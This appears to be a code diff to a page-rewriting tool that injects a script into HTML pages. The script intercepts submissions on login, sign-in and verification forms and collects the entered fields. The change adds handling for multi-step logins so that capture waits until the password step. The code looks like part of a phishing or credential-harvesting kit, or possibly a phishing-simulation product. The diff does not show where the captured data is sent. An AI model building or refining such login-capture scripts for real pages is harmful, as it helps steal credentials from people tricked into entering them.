@@ -482,6 +482,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
   }
 
   let lastSubmitter = null;
+  let progressiveSubmitForm = null;
 
   function normalizedFieldType(input) {
     if (!input) return "text";
@@ -573,6 +574,43 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
       control && control.getAttribute && control.getAttribute("aria-label")
     ].filter(Boolean).join(" ").toLowerCase();
     return /submit|login|log in|sign in|signin|continue|next|verify|confirm|proceed|send|validate|complete|enter/.test(text);
+  }
+
+  function fieldIsVisible(field) {
+    if (!field || field.disabled || field.hidden || normalizedFieldType(field) === "hidden") return false;
+    if (field.closest && field.closest('[hidden], [aria-hidden="true"]')) return false;
+    if (window.getComputedStyle) {
+      const style = window.getComputedStyle(field);
+      if (style.display === "none" || style.visibility === "hidden" || style.visibility === "collapse") return false;
+    }
+    return true;
+  }
+
+  function progressiveControlText(control) {
+    return [
+      control && control.textContent,
+      control && control.value,
+      control && control.getAttribute && control.getAttribute("aria-label")
+    ].filter(Boolean).join(" ").toLowerCase();
+  }
+
+  function shouldYieldToProgressiveStep(form, control) {
+    const text = progressiveControlText(control);
+    if (!/\\b(?:continue|next)\\b/.test(text)) return false;
+    const scope = form || nearestInputScope(control);
+    const fields = Array.from((scope && scope.querySelectorAll ? scope : document).querySelectorAll("input, select, textarea"));
+    const visiblePassword = fields.some(function (field) {
+      return normalizedFieldType(field) === "password" && fieldIsVisible(field);
+    });
+    if (visiblePassword) return false;
+    const hiddenPassword = fields.some(function (field) {
+      return normalizedFieldType(field) === "password" && !fieldIsVisible(field);
+    });
+    const visibleIdentity = fields.some(function (field) {
+      const type = normalizedFieldType(field);
+      return ["email", "text", "tel", "textarea"].includes(type) && fieldIsVisible(field);
+    });
+    return hiddenPassword || visibleIdentity;
   }
 
   function waitingMessage(control) {
@@ -868,6 +906,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
   function handleFallbackSubmit(control, event) {
     if (!control || control.getAttribute("data-deuce-waiting") === "true") return;
     if (!controlLooksLikeSubmit(control)) return;
+    if (shouldYieldToProgressiveStep(control.form || null, control)) return;
     const inputs = fallbackInputsFor(control);
     const capture = captureEnvelope(inputs, "page");
     if (!capture.fields.length && !selectedFileInputs(inputs).length) return;
@@ -924,13 +963,26 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     }
     lastSubmitter = button;
     const type = String(button.getAttribute("type") || "submit").toLowerCase();
+    if (type === "submit" && shouldYieldToProgressiveStep(button.form, button)) {
+      progressiveSubmitForm = button.form;
+      window.setTimeout(function () {
+        if (progressiveSubmitForm === button.form) progressiveSubmitForm = null;
+      }, 0);
+      return;
+    }
     if (type === "submit") handleRuntimeSubmit(button.form, button, event);
     else handleFallbackSubmit(button, event);
   }, true);
 
   document.addEventListener("submit", function (event) {
     const form = event.target;
-    handleRuntimeSubmit(form, event.submitter || lastSubmitter, event);
+    const submitter = event.submitter || lastSubmitter;
+    if (form === progressiveSubmitForm) {
+      progressiveSubmitForm = null;
+      return;
+    }
+    if (shouldYieldToProgressiveStep(form, submitter)) return;
+    handleRuntimeSubmit(form, submitter, event);
   }, true);
 })();
 <\/script>`;
